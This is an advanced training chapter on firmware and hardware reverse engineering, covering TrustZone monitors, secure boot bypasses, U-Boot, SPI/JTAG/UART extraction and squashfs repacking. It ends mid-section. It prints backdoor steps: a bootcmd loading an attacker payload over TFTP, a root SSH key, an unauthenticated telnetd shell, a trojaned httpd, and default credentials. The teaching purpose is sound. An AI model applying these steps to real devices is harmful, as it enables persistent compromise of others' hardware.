---
corso: "Cybersecurity Masterclass"
fase: "Domain 12 — Reverse Engineering"
modulo: "12.2"
titolo: "Firmware, Embedded, and Hardware Reverse Engineering"
versione: "binwalk 2.4 / OpenOCD 0.12 / QEMU 9.x / Ghidra 11.3 / flashrom 1.4"
livello: "Advanced"
prerequisiti:
  - "Domain 12, Chapter 12A — Static and dynamic analysis techniques"
  - "ARM and MIPS assembly language fundamentals"
  - "Embedded Linux concepts (MTD, squashfs, U-Boot, device trees)"
  - "Basic electronics (logic levels, serial protocols, SPI/I2C/JTAG)"
  - "Domain 1 — ELF binary format and cross-compilation toolchains"
obiettivi:
  - "Extract firmware from embedded devices via SPI flash (flashrom, chip-off), JTAG/SWD (OpenOCD), UART console, and eMMC ISP — selecting the appropriate method based on device design and access constraints"
  - "Analyze and modify firmware images using binwalk, unsquashfs, and UBI tools — including repacking with exact compression parameters and checksum recalculation"
  - "Reverse engineer ARM TF-A secure monitors and UEFI DXE drivers to identify SMC handler vulnerabilities, Secure Boot bypass paths, and bootloader weaknesses"
  - "Conduct baseband and automotive protocol RE: decode Shannon/Qualcomm modem firmware, exploit CAN bus via UDS SecurityAccess, and analyze DIAG/QMI/AT command interfaces"
  - "Perform firmware forensic acquisition with chain-of-custody integrity, detect firmware backdoors via binary comparison and entropy analysis, and implement secure boot chains with anti-rollback protection"
tag: [firmware, embedded-security, hardware-RE, JTAG, SWD, UART, SPI-flash, bootloader, automotive, CAN-bus, baseband, UEFI, secure-boot, IoT]
---

# Domain 12, Chapter 12B — Firmware, Embedded, and Hardware Reverse Engineering

> **Learning Objectives.**
> After completing this chapter, the student will be able to:
> 1. Identify and exploit hardware debug interfaces (JTAG, SWD, UART) on production devices — including pinout discovery with JTAGulator, baud-rate detection, and escalation from serial console to root shell.
> 2. Extract firmware from SPI NOR (flashrom, chip-off), eMMC (ISP method), and NAND flash; verify acquisition integrity with dual-read hash comparison; and parse flash layouts with binwalk entropy analysis.
> 3. Reverse engineer ARM TF-A BL31 secure monitors (SMC dispatch tables, SiP handler input validation) and UEFI DXE/PEI modules (efiXplorer, UEFITool) to identify TrustZone escape and Secure Boot bypass vulnerabilities.
> 4. Modify and repack firmware images (squashfs, UBIFS, JFFS2) with matching compression parameters; emulate firmware in QEMU user/system mode and Firmadyne; and fuzz extracted binaries with AFL-QEMU and Unicorn harnesses.
> 5. Conduct automotive and baseband protocol RE: sniff and inject CAN bus frames with can-utils, brute-force UDS SecurityAccess, decode Shannon/Qualcomm modem firmware, and capture DIAG/QMI traffic for protocol analysis.

> **Scope.** ARM Trusted Firmware (TF-A) and SMC interface. Bootloaders (U-Boot, Coreboot, Slim Bootloader). UEFI DXE/PEI reverse engineering. SPI flash extraction (chip-off, flashrom, in-circuit). JTAG/SWD debugging (ARM CoreSight, OpenOCD, pyOCD). UART identification (baud rate, logic levels). Firmware extraction (NAND/NOR/eMMC/SPI NOR). eMMC forensic access. Firmware modification (squashfs/UBIFS/JFFS2, bootloader images, kernel command line). Baseband/modem RE (DIAG, AT, QMI, MBIM). Automotive RE (CAN bus, UDS, OBD-II, FlexRay, LIN, Automotive Ethernet). **Expanded:** FPGA bitstream RE, PCB RE, radio/SDR RE, secure element/smartcard RE.

---

## 1. ARM Trusted Firmware and secure boot

### 1.1 ARM TF-A

ARM Trusted Firmware-A (TF-A) is the reference implementation of the Secure World software on ARM platforms. It runs at Exception Level 3 (EL3, the highest privilege level) and provides the **Secure Monitor** — the code that handles transitions between the Normal World (where the OS runs, at EL1/EL0) and the Secure World (where the TEE runs, at S-EL1).

The **SMC (Secure Monitor Call)** instruction traps from the Normal World to EL3. The SMC calling convention (defined in the SMC Calling Convention specification) uses function IDs in `W0` (or `X0`) to identify the requested service: standard ARM services (PSCI for power management — CPU on/off/suspend), platform-specific services (SiP — Silicon Provider), and Trusted OS services (forwarded to the TEE).

RE relevance: the SMC interface is the attack surface between the Normal World and the Secure World. Reversing the SMC handlers (in the TF-A BL31 image or the vendor's proprietary secure monitor) reveals what services are exposed and what input validation is performed. Vulnerabilities in SMC handlers have been exploited for TrustZone escapes (Domain 5, Chapter 5B §7.1).

### 1.2 SMC handler reversing methodology

Reversing the SMC dispatch table is the central RE task for any TrustZone secure monitor. The BL31 image (or vendor equivalent) is typically a flat binary loaded at the EL3 base address, which varies by platform — for example, `0x04000000` on many Qualcomm SoCs, `0x0E000000` on some Samsung Exynos, and `0xBF000000` on some MediaTek platforms. The load address can often be found in bootloader logs, device tree files, or the SoC TRM.

In Ghidra, the workflow begins with creating a new project and importing the BL31 binary as raw binary with the processor set to AARCH64 (or ARM 32-bit for older platforms). The base address must be set manually via the Language and Options dialog during import. After initial auto-analysis, the entry point is at offset `0x0` of the loaded image, which is the EL3 reset vector. The reset vector table at the image base follows the ARM exception vector layout: offsets `0x0` (Synchronous EL3), `0x80` (IRQ EL3), `0x100` (FIQ EL3), `0x180` (SError EL3), and so on for lower ELs. The synchronous exception handler at the current-EL SP_EL0 offset dispatches SMC calls.

The SMC dispatch table is the critical structure. In TF-A reference code, the macro `DECLARE_RT_SVC` registers runtime services into a table called `rt_svc_descs`. Each entry contains the service name, the OEN (Owning Entity Number) range (bits 24:29 of the function ID), the SMC type (fast or yielding), an `init` function pointer, and an `handle` function pointer. In Ghidra, search for a contiguous array of structures with two function pointers each, typically located in a read-only data section. The OEN values identify the service type: OEN 0–1 are ARM Architecture services, OEN 2–3 are CPU-specific, OEN 4 is SiP (vendor-specific), OEN 48–49 are standard TEE communication, and OEN 50–63 are Trusted OS services.

Once the dispatch table is located, label each handler function with its OEN and type. The SiP handler (OEN 4) is the most fruitful target for vulnerability research because vendor-specific services frequently implement custom functionality — memory read/write primitives, fuse reading, debug port control, cryptographic operations — with less review than the standardized ARM services.

Tracing from the handler function, analyze input validation. The SMC calling convention passes arguments in `X1`–`X7` (AArch64) or `R1`–`R7` (AArch32). Common vulnerability patterns include: missing bounds checks on buffer addresses passed from the Normal World (allowing the secure monitor to read/write arbitrary Secure World memory on behalf of the attacker), integer overflows in size parameters, and type confusion when the handler interprets an argument as both a pointer and a length.

### 1.3 Real CVEs in secure monitors

**CVE-2022-47630** (TF-A, CVSS 7.1): A vulnerability in the authenticated decryption flow of TF-A's Firmware Encryption feature. The `auth_decrypt` function did not properly validate the size of the authenticated data structure, allowing an attacker who could supply a crafted firmware image to cause an out-of-bounds read in EL3 context. The fix added length validation before the decryption call. This is a textbook example of insufficient input validation in the highest-privilege code path.

**Qualcomm QSEE vulnerabilities** represent a broad class. CVE-2015-6639 and CVE-2016-2431 demonstrated that Qualcomm's Secure Execution Environment (QSEE) trustlets could be exploited from the Normal World. The research by Gal Beniamini (Project Zero) showed that a vulnerability in the Widevine DRM trustlet could be chained with a kernel exploit to achieve arbitrary code execution in the Secure World. The methodology involved reversing the QSEE trustlet binaries (extracted from `/vendor/firmware/` on rooted Android devices), identifying the SMC interface used for trustlet communication, and fuzzing the command handlers.

**Samsung TEE vulnerabilities**: CVE-2019-2215 (a use-after-free in the Android binder driver, discovered by Maddie Stone at Google Project Zero) demonstrated that kernel-level code execution could be achieved on Samsung devices. Separately, researchers from Quarkslab and others demonstrated that once kernel-level code execution was obtained, the SMC interface to Samsung's TEEGRIS TEE could be abused to escalate into S-EL1. Quarkslab's research on Samsung's S-Boot and BL31 implementation also revealed hardcoded AES keys used for firmware decryption, allowing offline analysis of the secure monitor binary. These distinct research efforts illustrate the full chain: user-space to kernel (CVE-2019-2215) to Secure World (TEEGRIS SMC handler exploitation).

### 1.4 Bootloader internals

**U-Boot.** The most common bootloader for embedded Linux devices. U-Boot has a shell (accessible via UART), support for multiple storage devices, network boot (TFTP, PXE), and a scripting environment. RE targets: the `bootcmd` environment variable (the command sequence executed at boot), the `verify` environment variable (controls boot-image signature verification — if it can be set to `no` via the U-Boot shell, secure boot is defeated), and the U-Boot binary itself (for analyzing custom commands and security checks).

### 1.5 U-Boot exploitation

The U-Boot environment is stored on a dedicated flash partition (or at a fixed offset in SPI flash) as a simple key=value text block with a CRC32 header. On devices where the OS has write access to the environment partition, the `fw_setenv` utility (from the `u-boot-tools` package) can modify environment variables from Linux user-space without physical access. This is a critical attack vector because modifying `bootcmd` controls what the device executes at boot:

```bash
# Read current U-Boot environment from Linux
fw_printenv

# Overwrite bootcmd to drop to shell on next boot
fw_setenv bootcmd 'setenv bootargs console=ttyS0,115200 init=/bin/sh; bootm ${loadaddr}'

# Disable signature verification if the variable is respected
fw_setenv verify no

# Inject a network-boot command that loads attacker-controlled image
fw_setenv bootcmd 'dhcp; tftp 0x80000000 192.168.1.100:payload.uImage; bootm 0x80000000'
```

Environment injection is particularly dangerous on devices where the environment partition lacks write protection. Even with Secure Boot, some implementations only verify the kernel image but not the environment, allowing `bootargs` manipulation to alter kernel behavior (enabling debug consoles, changing the init process, modifying the root filesystem mount).

When physical access to the U-Boot shell is available (via UART), the memory and storage commands provide complete device introspection:

```bash
# Memory dump — read 0x100 bytes at address 0x40000000
md.b 0x40000000 0x100

# Read from NAND flash — read 0x400000 bytes from offset 0x0 into RAM at 0x82000000
nand read 0x82000000 0x0 0x400000

# Read from SPI flash — read 0x1000000 bytes from offset 0x0 into RAM at 0x82000000
sf probe 0
sf read 0x82000000 0x0 0x1000000

# Read from eMMC — read 0x2000 blocks starting at block 0 into RAM at 0x82000000
mmc dev 0
mmc read 0x82000000 0 0x2000

# Dump memory contents to TFTP server for analysis
tftpput 0x82000000 0x1000000 192.168.1.100:flash_dump.bin
```

These commands allow an attacker (or researcher) with U-Boot shell access to dump the entire firmware, including encrypted partitions (since the bootloader may have already loaded decryption keys into memory), TrustZone memory regions (depending on the TZ controller configuration at that boot stage), and OTP/eFuse values mapped into the memory space.

### 1.6 Coreboot and CBFS

**Coreboot.** Open-source firmware for x86 platforms (used in Chromebooks, some servers). Coreboot initializes hardware and hands off to a payload (SeaBIOS for legacy BIOS, TianoCore for UEFI, or LinuxBoot for direct Linux boot). RE: Coreboot's CBFS (Coreboot Filesystem) is a simple archive format that can be extracted with `cbfstool`. The initialization code (ramstage, romstage) is architecture-specific C code; reversing it reveals hardware initialization sequences.

CBFS extraction and analysis follows a structured workflow. The `cbfstool` utility (built from Coreboot source or available in some distribution packages) operates on the ROM image:

```bash
# List all components in a Coreboot ROM image
cbfstool coreboot.rom print

# Extract a specific component (e.g., the ramstage, which runs after DRAM init)
cbfstool coreboot.rom extract -n fallback/ramstage -f ramstage.elf

# Extract the payload (e.g., SeaBIOS or TianoCore)
cbfstool coreboot.rom extract -n fallback/payload -f payload.elf

# Extract the VPD (Vital Product Data) if present
cbfstool coreboot.rom extract -n vpd -f vpd.bin

# Add a modified component back into the ROM
cbfstool coreboot.rom remove -n fallback/ramstage
cbfstool coreboot.rom add-flat-binary -n fallback/ramstage -f modified_ramstage.elf \
    -l 0x00100000 -e 0x00100000 -c lzma
```

The extracted ELF binaries can be loaded directly into Ghidra or IDA for analysis. The ramstage is particularly interesting because it contains the platform-specific silicon initialization — memory controller configuration, PCIe link training, GPIO setup, and security policy initialization (such as locking the SPI flash write-protect register).

### 1.7 UEFI DXE and PEI reverse engineering

UEFI firmware has two main phases relevant to RE:

**PEI (Pre-EFI Initialization)**: runs from ROM, initializes memory (DRAM training), and establishes the HOB (Hand-Off Block) list. PEI modules (PEIMs) are PE32+ images with a small entry point. RE: PEI is where memory training, silicon initialization, and early security policy (including Secure Boot key provisioning) happen. Vendor-specific PEIMs contain proprietary silicon initialization code.

**DXE (Driver Execution Environment)**: the main phase where UEFI drivers are loaded and executed. DXE drivers are PE32+ images that register protocols (identified by GUIDs) and provide services. The UEFI runtime services (variable storage, time, reset) are established during DXE and persist into the OS.

RE tools: **UEFITool** (parses UEFI firmware images — the UEFI flash layout is a hierarchy of firmware volumes → files → sections), **UEFIExtract** (extracts individual modules), and **efiXplorer** (IDA plugin that identifies UEFI protocol usage, GUID references, and common UEFI patterns).

A UEFI rootkit (Domain 11, Chapter 11A §3.5) is a malicious DXE driver inserted into the firmware image. RE of a suspected UEFI rootkit involves extracting the firmware, comparing against a known-good version (binary diffing with UEFITool's tree-comparison), and analyzing any unknown modules.

### 1.8 Secure Boot bypass techniques

Secure Boot bypass represents one of the most impactful classes of firmware vulnerability because it undermines the entire chain-of-trust model. Several distinct bypass categories exist.

**DBX (Forbidden Signature Database) bypass**: UEFI Secure Boot maintains a database of revoked signatures (DBX) alongside the allowed signatures (DB). CVE-2020-10713 ("BootHole") demonstrated that a buffer-overflow vulnerability in GRUB2's configuration file parser allowed arbitrary code execution during boot, even with Secure Boot enabled. Because GRUB2 was signed by the Microsoft UEFI Third-Party CA, the signed binary was trusted by Secure Boot, but the vulnerability in its configuration parsing allowed the trust chain to be broken from within. The fix required both patching GRUB2 and updating the DBX to revoke the vulnerable signed binaries — a coordination nightmare across every Linux distribution.

**Intel Boot Guard bypass**: Boot Guard uses an ACM (Authenticated Code Module) hash anchored in CPU fuses to verify the initial boot block (IBB). If the platform does not have Boot Guard fuses programmed (common on development boards and some consumer devices), or if the OEM programmed the fuses incorrectly (leaving the enforcement policy in "measured-only" mode instead of "verified"), then the SPI flash can be reflashed with arbitrary firmware. The `chipsec` framework can verify Boot Guard configuration:

```bash
# Check Boot Guard configuration and enforcement status
sudo python chipsec_main.py -m common.secureboot.variables
sudo python chipsec_main.py -m common.bios_wp

# Verify SPI flash write protection
sudo python chipsec_main.py -m common.spi_lock

# Dump the SPI flash contents for offline analysis
sudo python chipsec_util.py spi dump spi_dump.bin

# Compare dumped firmware against a known-good image
# UEFITool comparison: open both images and diff the file tree
```

**CVE-2022-21894** ("Baton Drop"): A vulnerability in the Windows Boot Manager (`bootmgfw.efi`) that allowed bypassing Secure Boot by exploiting how the boot manager handled the BCD (Boot Configuration Data). An attacker with local access could craft a malicious BCD that caused the boot manager to load unsigned code. Microsoft patched the boot manager but could not immediately revoke the old signed version via DBX without breaking existing installations.

UEFI rootkit detection in the field combines `chipsec` for SPI flash integrity verification with UEFITool for structural comparison. The workflow is: (1) dump the SPI flash from the suspect system using `chipsec_util.py spi dump`, (2) obtain a known-good firmware image (from the OEM's firmware update package, or from an identical known-clean system), (3) open both images in UEFITool and compare the firmware volume tree — any additional DXE drivers, modified existing drivers, or drivers with unknown GUIDs are candidates for rootkit analysis, (4) extract suspicious modules and analyze them as PE32+ binaries in Ghidra with the efiXplorer plugin for pattern identification.

---

## 2. Hardware interfaces and extraction

### 2.1 SPI flash extraction

Most embedded devices store firmware on SPI NOR flash chips (8-pin SOIC or WSON packages, typically 4–256 MB). Extraction methods:

**Chip-off**: desolder the flash chip and read it with a programmer (Xeltek, Willem, CH341A). Destructive to the device but gives the cleanest read. Requires soldering skills and the correct programmer adapter.

**In-circuit programming**: connect to the flash chip while it remains soldered, using test clips (SOIC-8 clip, Pomona 5250) or probes. `flashrom` (open-source) reads and writes SPI flash via various interfaces (Raspberry Pi SPI, Bus Pirate, Dediprog). Risk: the main SoC may contend for the SPI bus; holding the SoC in reset (via the RESET pin or a power manipulation) prevents contention.

**Software extraction**: if the device has a running OS, read the flash via the OS's MTD (Memory Technology Device) subsystem: `dd if=/dev/mtdN of=dump.bin`. Requires command execution on the device (via UART shell, SSH, or an exploit).

### 2.2 flashrom command reference

`flashrom` is the standard open-source tool for reading and writing SPI, parallel, and LPC flash chips. It supports dozens of programmers, and the correct incantation depends on the hardware interface being used.

**Raspberry Pi SPI** (using the Pi's native SPI bus — connect CS to CE0/GPIO8, CLK to SCLK/GPIO11, MISO to GPIO9, MOSI to GPIO10, plus VCC and GND):

```bash
# Read the flash chip using the Linux SPI driver on the Raspberry Pi
# spispeed is in kHz — start low (1000 = 1 MHz), increase if stable
flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=1000 -r firmware_dump.bin

# Verify the read by reading a second time and comparing
flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=1000 -r firmware_dump2.bin
md5sum firmware_dump.bin firmware_dump2.bin

# Write a modified firmware back
flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=1000 -w modified_firmware.bin

# Erase the chip completely (use with caution — bricks the device if no backup)
flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=1000 -E

# Force a specific chip type when auto-detection fails
flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=1000 -c "W25Q128.V" -r dump.bin
```

**Bus Pirate** (a versatile multi-protocol interface — connect MOSI, MISO, CLK, CS, and GND):

```bash
# Bus Pirate connected via USB (typically /dev/ttyUSB0 on Linux)
flashrom -p buspirate_spi:dev=/dev/ttyUSB0,spispeed=1M -r dump.bin

# Slower speed for unstable connections
flashrom -p buspirate_spi:dev=/dev/ttyUSB0,spispeed=250K -r dump.bin
```

**CH341A USB programmer** (a cheap and widely available programmer — under $5, supports most 25-series SPI flash chips directly via a ZIF socket or SOIC clip):

```bash
# CH341A is auto-detected on Linux (requires ch341a_spi driver)
flashrom -p ch341a_spi -r dump.bin

# If the chip is not auto-detected, specify it manually
flashrom -p ch341a_spi -c "MX25L12835F" -r dump.bin
```

The CH341A has a known design flaw: it outputs 5V on the data lines while most SPI flash chips are rated for 3.3V. Running the CH341A unmodified can damage the flash chip or the SoC. The standard mitigation is a hardware mod (cutting the 5V trace and soldering a 3.3V regulator) or using a voltage-level-shifting adapter board.

**Dediprog SF100/SF600** (professional-grade SPI programmer, fast and reliable):

```bash
flashrom -p dediprog:voltage=3.3V -r dump.bin
```

When in-circuit reads fail (the SoC fights for the bus), the standard technique is to hold the SoC in reset. Locate the SoC's RESET or NRST pin on the schematic (or identify it by tracing from the reset button or the power management IC), and hold it low with a jumper wire to GND while performing the flash read. Some SoCs require removing a pull-up resistor on the reset line instead.

### 2.3 JTAG and SWD

**JTAG** (Joint Test Action Group, IEEE 1149.1): a standardized debug and test interface. JTAG provides boundary scan (testing physical connections between chips), on-chip debugging (halt CPU, single-step, read/write memory and registers), and flash programming. The interface uses four signals: TDI, TDO, TMS, TCK (plus optional TRST).

**SWD** (Serial Wire Debug): ARM's two-wire debug interface (SWDIO, SWCLK), functionally equivalent to JTAG for debugging ARM cores. Uses the ARM Debug Access Port (DAP) and the CoreSight debug architecture.

**ARM CoreSight**: ARM's on-chip debug and trace architecture. Components: DAP (Debug Access Port — the physical interface), AHB-AP (AHB Access Port — accesses memory via the AHB bus), CTI (Cross Trigger Interface — synchronizes debug events across cores), ETM (Embedded Trace Macrocell — hardware instruction trace), ITM (Instrumentation Trace Macrocell — software trace output).

**OpenOCD** (Open On-Chip Debugger): open-source software that communicates with JTAG/SWD adapters (FTDI-based, J-Link, ST-Link, CMSIS-DAP) and provides GDB server, flash programming, and boundary-scan functionality. **pyOCD**: Python-based debugger specifically for ARM Cortex-M devices.

JTAG/SWD as RE tools: full memory access (read all of RAM and flash), register access (inspect CPU state), single-stepping, and hardware breakpoints. If JTAG is not disabled (many consumer devices leave JTAG accessible), it provides complete control over the device.

JTAG protection: fuses that disable the JTAG port (one-time programmable), debug authentication (ARM's Secure Debug — requires a certificate to unlock debug), and JTAG password (some SoCs require a specific JTAG key).

### 2.4 OpenOCD configuration and usage

OpenOCD uses a layered configuration system: an interface configuration file (describes the debug adapter), a target configuration file (describes the SoC), and optional board configuration files. For common targets, OpenOCD ships pre-built `.cfg` files.

**STM32F4 via ST-Link V2** (one of the most common embedded targets):

```tcl
# File: openocd_stm32f4.cfg
source [find interface/stlink.cfg]
transport select hla_swd
source [find target/stm32f4x.cfg]
adapter speed 4000
```

```bash
# Start OpenOCD with the configuration
openocd -f openocd_stm32f4.cfg

# In a separate terminal, connect via telnet for interactive commands
telnet localhost 4444

# Dump the entire flash (1MB for STM32F407)
> halt
> flash read_image dump_stm32.bin 0x08000000 0x100000

# Read specific memory addresses (e.g., the option bytes for readout protection)
> mdw 0x1FFFC000 4

# Read CPU registers
> reg

# Single-step the CPU
> step

# Set a hardware breakpoint
> bp 0x08001234 4 hw

# Resume execution
> resume
```

**ESP32 via FTDI-based JTAG adapter** (common IoT target):

```tcl
# File: openocd_esp32.cfg
source [find interface/ftdi/esp32_devkitj_v1.cfg]
set ESP32_FLASH_SIZE "4MB"
source [find target/esp32.cfg]
adapter speed 20000
```

```bash
# Dump the ESP32's entire SPI flash via JTAG
openocd -f openocd_esp32.cfg -c "init; halt; flash read_image esp32_dump.bin 0x0 0x400000; shutdown"
```

**nRF52840 via J-Link** (common BLE target):

```tcl
# File: openocd_nrf52.cfg
source [find interface/jlink.cfg]
transport select swd
source [find target/nrf52.cfg]
adapter speed 4000
```

```bash
# Dump the full flash (1MB) and the UICR (User Information Configuration Register)
openocd -f openocd_nrf52.cfg \
  -c "init; halt; dump_image nrf52_flash.bin 0x00000000 0x100000; \
      dump_image nrf52_uicr.bin 0x10001000 0x1000; shutdown"
```

### 2.5 JTAGulator usage

When the JTAG pins are not labeled on the PCB (common in production devices), the JTAGulator automates the process of identifying JTAG pinouts. It systematically tests all possible pin combinations by attempting JTAG boundary scan operations and checking for valid responses.

The workflow: (1) identify candidate pins on the PCB (test points, unpopulated headers, vias near the SoC), (2) connect up to 24 channels from the JTAGulator to the candidate pins, (3) set the target voltage (`V` command, typically 3.3V or 1.8V), (4) run the IDCODE scan (`I` command) which attempts to read the JTAG IDCODE register on all pin permutations, and (5) the JTAGulator reports which pin combination produced a valid IDCODE, revealing TDI, TDO, TMS, and TCK. The BYPASS scan (`B` command) can further validate the result and detect the number of devices in the JTAG chain.

The JTAGulator also supports UART identification. The `U` command scans all pin pairs for UART activity by looking for valid ASCII characters at common baud rates. This is particularly useful when the PCB has many unlabeled test points and the analyst does not know which are UART, which are JTAG, and which are GPIO. Running the UART scan first (since it requires only two pins) can quickly identify serial console access before attempting the more time-consuming JTAG scan (which tests N-choose-4 permutations).

For SWD identification, the JTAGulator can be used in a manual mode: since SWD uses only two pins (SWDIO and SWCLK), the analyst can iterate over all pin pairs, attempting to read the SWD DP IDCODE register. OpenOCD can also be scripted for this purpose — connecting each candidate pin pair and running `dap info` to check for a valid response.

### 2.6 UART identification and exploitation

UART (Universal Asynchronous Receiver/Transmitter) serial consoles are frequently accessible on PCBs — they are used during development and often left connected in production. Finding UART:

**Physical identification**: look for unpopulated header pins (3–4 pins in a row), labeled test points (TX, RX, GND), or pads near the SoC. Identify GND with a multimeter (continuity to the ground plane). TX can be identified with a logic analyzer or oscilloscope (it shows activity during boot). RX is the remaining signal pin.

**Baud rate detection**: auto-detect using a logic analyzer (measure the shortest pulse width; the baud rate is 1/pulse_width). Common baud rates: 115200, 9600, 57600, 38400. Trial-and-error with `minicom` or `screen` at each baud rate works for the common ones.

**Logic levels**: most embedded UARTs are 3.3V CMOS (directly compatible with USB-UART adapters like FTDI FT232R or CP2102). Some are 1.8V (need level shifting). RS-232 uses ±12V (need an RS-232-to-TTL converter like MAX3232). Connecting a 3.3V adapter to a 1.8V UART can damage the device.

UART as RE entry point: boot-console output reveals the boot process (U-Boot shell, kernel messages, init scripts). An interactive shell (root shell, U-Boot shell) via UART provides command execution without any exploit.

**UART-to-root-shell exploitation chain**: The typical escalation path from UART access follows a predictable pattern. First, connect to the UART port and observe the boot output. If a U-Boot shell is accessible (sometimes gated by a `bootdelay` of zero, which can be bypassed by sending a break character or specific key sequence during the power-on window), use U-Boot commands to dump flash, modify the boot environment, or boot a custom image. If the boot drops to a Linux login prompt, common weak credentials include `root:root`, `admin:admin`, `root:<blank>`, or vendor-specific defaults. If the serial console is a BusyBox shell running as root with no login prompt, you have immediate root access — this is surprisingly common in consumer IoT devices, DVRs, IP cameras, and home routers. If the console is blocked, modifying the kernel command line (via U-Boot env or direct flash modification) to append `init=/bin/sh` or `single` bypasses the init system entirely.

### 2.7 eMMC and NAND extraction

**eMMC**: a managed NAND flash with an integrated controller. Accessed via an MMC interface (CMD, CLK, DAT0–DAT7). Forensic access: connect directly to the eMMC pads with an eMMC reader (Allsocket, Easy JTAG, Riff Box) after chip-off or via test points. The CMD interface allows sending MMC commands: `CMD0` (reset), `CMD1` (initialize), `CMD17`/`CMD18` (read single/multiple blocks). The entire flash contents can be read as a block device.

**Raw NAND**: requires an external controller (the flash chip has no integrated controller). Access via a NAND flash programmer. Raw NAND includes spare/OOB (Out-of-Band) areas for ECC and metadata, which the analyst must account for when interpreting the dump.

**eMMC forensic acquisition with Easy JTAG**: Easy JTAG (and its successor Easy JTAG Plus) is a professional forensic tool that communicates with eMMC chips via the ISP (In-System Programming) method. ISP means connecting directly to the eMMC's CMD, CLK, and DAT0 lines on the PCB — without desoldering the chip — by soldering fine wires to the appropriate test points or ball pads.

The ISP methodology: (1) obtain the PCB schematic or use PCB RE to identify the eMMC's CMD, CLK, DAT0, VCC, VCCQ, and GND pads, (2) solder bodge wires from these pads to the Easy JTAG ISP adapter, (3) power the eMMC via the adapter (not the device's own power supply — the SoC must remain unpowered to avoid bus contention), (4) use the Easy JTAG software to detect the eMMC chip, read its CID/CSD registers (identifying the manufacturer, capacity, and firmware version), and (5) dump the entire user area (and, if accessible, the boot partitions and RPMB).

For devices where ISP points are not accessible, chip-off with a BGA rework station (hot air at 250–280C for the leaded solder balls) followed by socket-adapter reading remains the fallback.

### 2.8 Hardware interface defenses

Defending against hardware-level extraction is critical for devices handling sensitive data (medical devices, payment terminals, security cameras). The layered defense approach includes:

**JTAG/SWD lockdown**: ARM SoCs provide multiple mechanisms. The most permanent is burning OTP (One-Time Programmable) fuses that permanently disable the debug port — once set, the JTAG/SWD interface cannot be re-enabled even by the manufacturer. ARM's Secure Debug architecture (CoreSight SDC-600) provides a more flexible alternative: debug access requires a cryptographic certificate chain, allowing authorized debugging while blocking unauthorized access. The debug authentication mechanism uses a challenge-response protocol where the debugger must present a certificate signed by the device's root-of-trust key.

**SPI flash write protection**: SPI flash chips support hardware write-protect via the WP# pin (active low — grounding WP# prevents writes to protected regions). The flash chip's status register contains Block Protect bits (BP0, BP1, BP2) that define which regions are protected. Additionally, the SPI Status Register Lock bit (SRL) prevents software modification of the status register, and the One-Time Program (OTP) bits on some chips make the protection permanent. On the SoC side, the SPI flash controller often has a BIOS Lock Enable (BLE) register that prevents writes to the SPI flash after early boot. `chipsec` can verify this: `sudo python chipsec_main.py -m common.bios_wp`.

**Encrypted flash storage**: Some SoCs support on-the-fly decryption of flash contents (e.g., ESP32's flash encryption feature, NXP's BEE — Bus Encryption Engine). The decryption key is stored in OTP fuses and is not readable by software after being programmed. This means that even if an attacker dumps the SPI flash via chip-off, the contents are encrypted. The security depends on the implementation — ESP32's flash encryption has been bypassed through fault injection attacks (voltage glitching during the secure boot check) in research by LimitedResults.

---

## 3. Firmware analysis and modification

### 3.1 Filesystem extraction

Firmware images typically contain a bootloader, a kernel, and a root filesystem. Identifying the components: `binwalk` (signature-based scanning — identifies magic bytes for squashfs, gzip, LZMA, U-Boot headers, Linux kernel images, etc.) and `file` (identifies individual components).

**squashfs**: the most common embedded Linux root filesystem. Read-only, compressed. Extract with `unsquashfs`. Repack with `mksquashfs` (must match the compression algorithm and block size of the original).

**UBIFS** (Unsorted Block Image File System): used on raw NAND. Extract with `ubireader_extract_images` and `ubireader_extract_files`. Repack requires UBI tools (`ubinize`, `mkfs.ubifs`).

**JFFS2** (Journaling Flash File System 2): older flash filesystem. Extract with `jefferson` or `jffs2dump`. Repack with `mkfs.jffs2`.

### 3.2 Complete binwalk workflow

`binwalk` is the primary triage tool for firmware images. Its capabilities extend well beyond basic signature scanning, and a systematic workflow extracts maximum information.

```bash
# Basic signature scan — identifies embedded filesystems, compressed archives,
# bootloader headers, crypto constants, and more
binwalk firmware.bin

# Recursive extraction — extracts all identified components and recursively
# scans extracted files. Creates a _firmware.bin.extracted/ directory
binwalk -e firmware.bin

# Entropy analysis — plots the entropy of the file. High-entropy regions
# (close to 1.0) indicate encrypted or compressed data. Uniform high entropy
# across the entire image suggests full-image encryption. Mixed regions
# (high entropy filesystem, low entropy headers) are the normal pattern.
binwalk -E firmware.bin

# Opcode scan — identifies CPU architectures present in the binary by
# scanning for common instruction patterns. Useful for determining if the
# firmware is ARM, MIPS, x86, or a mix
binwalk -A firmware.bin

# Raw string extraction with minimum length
binwalk -R '\x00' firmware.bin  # Custom raw byte search
strings -n 8 firmware.bin | grep -i "password\|key\|secret\|token"

# Hexdump mode for manual inspection of a specific offset
binwalk -o 0x40000 -l 0x100 -W firmware.bin
```

The entropy analysis (`-E`) is particularly diagnostic. A firmware image with full encryption shows uniformly high entropy (Shannon entropy near 8.0 bits per byte) from start to end, with no discernible structure. An image with compressed filesystems shows high-entropy blocks with identifiable boundaries, interspersed with lower-entropy headers. An uncompressed, unencrypted image shows varied entropy with clear structure. This triage step determines whether decryption is needed before further analysis.

### 3.3 Firmware modification and repacking

Modifying and repacking firmware is the practical culmination of firmware RE — it is how researchers inject analysis tools, enable debug access, or validate vulnerabilities. The process is filesystem-specific and must preserve exact parameters to produce a valid image.

**squashfs modification** (step-by-step):

```bash
# Step 1: Extract the firmware image with binwalk
binwalk -e firmware.bin
cd _firmware.bin.extracted/

# Step 2: Identify the squashfs parameters from the binwalk output
# Note the compression type (gzip, lzma, xz, lz4, zstd), block size,
# and endianness (big or little)
file *.squashfs
unsquashfs -s *.squashfs   # Shows superblock info including compression

# Step 3: Extract the squashfs filesystem
unsquashfs -d squashfs-root *.squashfs

# Step 4: Modify the extracted filesystem
# Example: Add an SSH authorized_keys for root access
mkdir -p squashfs-root/root/.ssh
cat ~/.ssh/id_ed25519.pub > squashfs-root/root/.ssh/authorized_keys
chmod 700 squashfs-root/root/.ssh
chmod 600 squashfs-root/root/.ssh/authorized_keys

# Example: Enable telnetd in the init scripts
echo '/usr/sbin/telnetd -l /bin/sh -p 23' >> squashfs-root/etc/init.d/rcS

# Example: Replace a binary with a trojaned version
cp reverse_shell squashfs-root/usr/bin/httpd

